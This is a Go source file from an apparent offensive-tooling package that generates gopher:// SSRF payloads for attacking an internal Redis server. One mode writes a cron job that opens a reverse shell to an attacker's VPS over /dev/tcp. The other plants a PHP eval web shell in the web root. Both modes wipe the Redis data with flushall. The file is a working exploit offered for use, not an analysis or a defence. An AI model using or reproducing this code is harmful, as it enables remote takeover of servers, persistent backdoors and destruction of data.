package exploits

import (
	"bufio"
	"fmt"
	"net/url"
	"os"
	"strings"
)

var (
	shellType   string
	rootLoc     string
	shell       string
	err         error
	vpsIp       string
	crontabPath string
	inputReader *bufio.Reader
)

func RedisGetPayload() string {
	inputReader = bufio.NewReader(os.Stdin)
	fmt.Printf("\033[1;31;m%s\033[0m\n", "[!] WARNING: This exploit maybe dangerous")
	fmt.Printf("\033[1;32;m%s\033[0m", "[*] What do you want to do? (ncshell OR phpshell): ")
	fmt.Scanln(&shellType)
	if shellType == "ncshell" {
		fmt.Printf("\u001B[1;32;m%s\u001B[0m", "[*] Enter your vps IP(default is 127.0.0.1): ")
		vpsIp, err = inputReader.ReadString('\n')
		vpsIp = strings.Replace(vpsIp, "\n", "", -1)
		fmt.Printf("\u001B[1;32;m%s\u001B[0m", "[*] Enter crontab directory(default is /var/spool/cron/): ")
		crontabPath, err = inputReader.ReadString('\n')
		crontabPath = strings.Replace(crontabPath, "\n", "", -1)

		if vpsIp == "" {
			vpsIp = "127.0.0.1"
		}
		if crontabPath == "" {
			crontabPath = "/var/spool/cron/"
		}
		cmd := "*/1 * * * * bash -c \"sh -i >& /dev/tcp/" + vpsIp + "/1234 0>&1\""
		payload := "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\n1\r\n$" + fmt.Sprintf("%d", len(cmd)+5)
		payload = payload + "\r\n" + cmd + "\n\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$" + fmt.Sprintf("%d", len(crontabPath))
		payload = payload + "\r\n" + crontabPath + "\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n*1\r\n$4\r\nsave\r\n"
		encodePayload := url.QueryEscape(payload)
		finalPayload := strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(encodePayload, "+", "%20"), "%2F", "/"), "%25", "%"), "%3A", ":")
		return "gopher://127.0.0.1:6379/_" + finalPayload
	} else if shellType == "phpshell" {
		fmt.Printf("\033[1;32;m%s\033[0m", "[*] Enter the root location of the web server (default is /var/www/html): ")
		rootLoc, err = inputReader.ReadString('\n')
		rootLoc = strings.Replace(rootLoc, "\n", "", -1)
		fmt.Printf("\033[1;32;m%s\033[0m", "[*] Enter your webshell (default is '<?php eval($_POST[a]);?>' ): ")
		shell, err = inputReader.ReadString('\n')
		shell = strings.Replace(shell, "\n", "", -1)

		if rootLoc == "" {
			rootLoc = "/var/www/html"
		}
		if shell == "" {
			shell = "<?php eval($_POST[a]);?>"
		}
		payload := "*1\r\n$8\r\nflushall\r\n*3\r\n$3\r\nset\r\n$1\r\n1\r\n$" + fmt.Sprintf("%d", len(shell)+4)
		payload = payload + "\r\n" + shell + "\n\r\n*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$"
		payload = payload + fmt.Sprintf("%d", len(rootLoc)) + "\r\n" + rootLoc + "\r\n*4\r\n$6\r\nconfig\r\n$3\r\n"
		payload = payload + "set\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n*1\r\n$4\r\nsave\r\n"
		encodePayload := url.QueryEscape(payload)
		finalPayload := strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(encodePayload, "+", "%20"), "%2F", "/"), "%25", "%"), "%3A", ":")
		return "gopher://127.0.0.1:6379/_" + finalPayload
	} else {
		return "[!] No shell found"
	}
}
